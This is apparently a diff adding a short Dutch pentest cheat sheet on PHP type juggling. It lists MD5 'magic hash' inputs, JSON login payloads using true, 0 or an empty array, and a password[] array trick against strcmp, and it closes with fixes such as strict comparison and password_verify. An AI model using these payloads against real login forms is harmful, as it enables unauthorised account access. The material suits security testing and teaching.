@@ -1,0 +1,26 @@
+# PHP Type Juggling - Loose Comparison Bypass
+# === Magic Hashes (MD5 begint met 0e[0-9]+) ===
+# PHP loose comparison: "0e123" == "0e456" -> true (beide zijn 0 in scientific notation)
+# Bekende magic hash inputs (MD5 begint met 0e):
+# "240610708" -> 0e462097431906509019562988736854
+# "QLTHNDT"   -> 0e405967825401955372549139051580
+# "QNKCDZO"   -> 0e830400451993494058024219903391
+# "PJNPDWY"   -> 0e291529052894702774557631701704
+# "aabg7XSs"  -> 0e087386482136013740957780965295
+# "aabC9RqS"  -> 0e041022518165728065344349536617
+# === Auth bypass via type juggling ===
+# Als PHP code: if(md5($input) == $stored_hash)
+# En stored hash begint met 0e... -> stuur een magic hash input
+# === JSON type confusion ===
+# POST met Content-Type: application/json
+# {"password": true}   (bool true == "anything" in PHP)
+# {"password": 0}      (int 0 == "string" als string niet numeriek begint)
+# {"password": []}     (array == null in sommige contexten)
+# === strcmp bypass ===
+# PHP strcmp(array, string) returns NULL, en NULL == 0 is true
+# POST: password[]=anything
+# === Voorkom (secure code) ===
+# Gebruik === (strict comparison) in plaats van ==
+# Gebruik password_verify() voor wachtwoord checks
+# Tip: Zoek naar == in PHP source code (whitebox)
+# Tip: Probeer JSON body met boolean/integer waarden bij login forms
